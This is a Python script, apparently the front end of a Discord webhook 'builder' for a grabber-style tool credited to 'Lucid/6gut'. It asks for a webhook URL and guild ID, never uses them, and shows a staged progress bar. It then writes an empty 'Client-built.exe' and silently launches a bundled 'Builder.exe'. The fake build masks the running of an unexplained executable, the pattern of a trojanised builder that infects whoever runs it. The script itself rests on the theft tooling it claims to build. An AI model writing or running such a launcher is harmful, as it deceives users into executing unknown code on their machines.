import time
import sys
import subprocess
import os
def print_loading_text():
    _text = 'loading...'
    for i in range(len(_text)):
        time.sleep(0.3)
        sys.stdout.write('\033[2J\033[H')  # Clear console
        print('\033[38;5;226m' + _text[0:i + 1] + '\033[0m', end='', flush=True)
        sys.stdout.flush()
    sys.stdout.write('\r' + ' ' * len(_text) + '\r')  # Clear loading text
    sys.stdout.flush()


def print_color_ascii(text):
    for i, line in enumerate(text.split('\n')):
        r = int((58 * i + 17 * (10 - i)) / 10)
        g = int((175 * i + 9 * (10 - i)) / 10)
        b = int((221 * i + 244 * (10 - i)) / 10)
        color_code = '\033[38;2;{};{};{};1m'.format(r, g, b)
        print(color_code + line + '\033[0m')


asciiart = r'''

   ▄████████  ▄██████▄   ▄█          ▄████████    ▄████████ 
  ███    ███ ███    ███ ███         ███    ███   ███    ███ 
  ███    █▀  ███    ███ ███         ███    ███   ███    ███ 
  ███        ███    ███ ███         ███    ███  ▄███▄▄▄▄██▀ 
▀███████████ ███    ███ ███       ▀███████████ ▀▀███▀▀▀▀▀   
         ███ ███    ███ ███         ███    ███ ▀███████████ 
   ▄█    ███ ███    ███ ███▌    ▄   ███    ███   ███    ███ 
 ▄████████▀   ▀██████▀  █████▄▄██   ███    █▀    ███    ███ 
                        ▀                        ███    ███ 

'''

ascii_width = max(map(len, asciiart.split('\n')))
made_by_text = 'Made by Lucid/6gut'
made_by_color_code = '\033[38;2;0;165;255m'
made_by_width = len(made_by_text)
padding_width = (ascii_width - made_by_width) // 2
made_by_text_padded = ' ' * padding_width + made_by_text
print_loading_text()
print_color_ascii(asciiart)
print(made_by_color_code + made_by_text_padded + '\033[0m\n')
enter_color_code = '\033[38;2;0;0;255m'
small_font = '\033[6m'
time.sleep(2)
print('\n\n\n\n' + enter_color_code + small_font + 'Press Enter for BUILDER' + '\033[0m', end='', flush=True)
input()
print('\r' + ' ' * 40 + '\r', end='', flush=True)

webhook_url = input(enter_color_code + small_font + 'Enter WebHook: ' + '\033[0m').strip()

if not webhook_url.startswith('https://discord.com/api/webhooks/'):
    print(enter_color_code + small_font + 'Invalid WebHook' + '\033[0m')
    sys.exit()

print(enter_color_code + small_font + 'WebHook is valid' + '\033[0m')

# Verify Guild ID
guild_id = input(enter_color_code + small_font + 'Enter Guild id: ' + '\033[0m').strip()

if not guild_id.isdigit() or len(guild_id) != 19:
    print(enter_color_code + small_font + 'Invalid Guild id' + '\033[0m')
    sys.exit()

print(enter_color_code + small_font + 'Valid Guild id' + '\033[0m')
sys.stdout.write(enter_color_code + small_font + 'Success! Building..' + '\033[0m\n')

for i in range(21):
    time.sleep(0.25)
    progress_bar = '\u2588' * i + ' ' * (20 - i)
    sys.stdout.write('\r' + enter_color_code + small_font + '[ {0} ]'.format(progress_bar))
    sys.stdout.flush()

print(enter_color_code + small_font + 'Building Complete' + '\033[0m')

# Create an empty .exe file
with open('Client-built.exe', 'w') as file:
    pass

try:
    subprocess.run(['Builder.exe'], check=True, capture_output=True, text=True)
except subprocess.CalledProcessError as e:
    print('Error:', e)

sys.exit(0)